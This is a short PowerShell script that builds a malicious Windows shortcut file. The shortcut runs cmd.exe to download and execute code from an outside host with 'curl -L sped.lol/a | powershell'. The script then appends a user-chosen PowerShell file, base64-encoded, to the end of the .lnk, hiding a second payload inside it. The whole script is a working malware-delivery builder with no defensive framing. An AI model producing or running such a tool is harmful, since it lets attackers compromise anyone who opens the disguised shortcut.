$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$PSSCRIPTROOT\main.lnk")
$Shortcut.TargetPath = "cmd.exe"
$Shortcut.Arguments = "/c `"curl -L sped.lol/a | powershell`""
$Shortcut.Save()

Start-Sleep -s 1

Write-Host "Enter the path to the ps1 file -> " -NoNewline
$exe = Read-Host
$bytes = [System.IO.File]::ReadAllBytes($exe)
$encoded = [Convert]::ToBase64String($bytes)
$encoded_bytes = [System.Text.Encoding]::ASCII.GetBytes($encoded)

$shorcut_bytes = [System.IO.File]::ReadAllBytes("$PSSCRIPTROOT\main.lnk")
$new_line_bytes = [System.Text.Encoding]::ASCII.GetBytes("`n")

$final_bytes = $shorcut_bytes + $new_line_bytes + $encoded_bytes

[System.IO.File]::WriteAllBytes("$PSSCRIPTROOT\main.lnk", $final_bytes)
